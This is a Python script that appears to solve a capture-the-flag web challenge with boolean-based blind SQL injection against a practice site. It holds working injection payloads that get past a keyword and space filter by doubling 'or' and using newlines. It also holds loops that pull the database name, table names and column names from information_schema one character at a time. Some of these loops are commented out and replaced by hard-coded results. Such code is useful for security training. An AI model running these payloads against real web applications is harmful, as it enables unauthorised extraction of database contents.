# -*- coding:utf-8 -*-
import requests
import string
def extract(rawstr):
    newstr = rawstr.replace(' ',chr(0x0a)).replace('or','oorr')
    return newstr

def main():
    url=r'http://ctf5.shiyanbar.com/web/earnest/index.php'
    ss=requests.session()
    cset=string.ascii_lowercase+string.digits+'!_{}@~';
    true_state='You are in'
    # lens=0
    # index = 1
    # model="0' or length(database())=%d or '1'='"
    # while True:
    #     tmp = model % index
    #     payload={'id':extract(tmp)}
    #     res=ss.post(url,data=payload).content
    #     if true_state in str(res):
    #         lens = index
    #         break
    #     index += 1
    #     if index >30:
    #         break
    # print(lens)
    len_database = 18
    print("[+]database_len:%d"%len_database)

    # strs=''
    # model="0'or(select database() regexp '%s$')or'1'='"
    # for i in range(len_database):
    #     for c in cset:
    #         tmp = model %(c+strs)
    #         payload = {'id':extract(tmp)}
    #         res = ss.post(url,data=payload).content
    #         if true_state in str(res):
    #             strs = c + strs
    #             print(strs)
    #             break
    #         #print(res)
    # print('[+]database:%s'%strs)
    strs= 'ctf_sql_bool_blind'
    # lens = 1
    # model = "0' or length((select group_concat(table_name separator '@') from information_schema.tables where table_schema=database() limit 1))=%d or '1'='"
    # while True:
    #     tmp = model%lens
    #     payload = {'id':extract(tmp)}
    #     res = ss.post(url,data=payload).content
    #     if true_state in str(res):
    #         break
    #     lens += 1
    #     if lens > 40:
    #         break
    # print("[+]lens:table_name_length:%d"%lens)
    table_name_length = 10
    strs = ''
    model = "0'or(select((select group_concat(table_name separator '@') from information_schema.tables where table_schema=database())) regexp '%s$')or'1'='"
    # for i in range(10):
    #     for c in cset:
    #         tmp = model%(c+strs) 
    #         payload = {'id':extract(tmp)}
    #         res = ss.post(url,data=payload).content
    #         if true_state in str(res):
    #             strs = c + strs
    #             print("right:"+strs)
    #             break
    table_name="fiag,users"
    # lens = 1
    # model = "0' or (length((select group_concat(column_name) from information_schema.columns where table_name='fiag'))=%d) or '1'='"
    # while True:
    #     tmp = model%lens
    #     payload = {'id':extract(tmp)}
    #     res = ss.post(url,data=payload).content
    #     if true_state in str(res):
    #         break
    #     lens += 1
    #     if lens > 20:
    #         break
    # print("[+]lens:column_name_length:%d"%lens)
    lens=5
    strs = ''
    model = "0'or(select((select group_concat(column_name) from information_schema.columns where table_name='fiag')) regexp '^%s')or'1'='"
    tmp = model %('*')
    payload = {'id':extract(tmp)}
    res = ss.post(url,data=payload).content
    print(res)
    # for i in range(5):
    #     for c in cset:
    #         tmp = model%(strs+c) 
    #         payload = {'id':extract(tmp)}
    #         res = ss.post(url,data=payload).content
    #         if true_state in str(res):
    #             strs = strs + c
    #             print("right:"+strs)
    #             break

    # column_name='ag$'
if __name__== '__main__':
    main()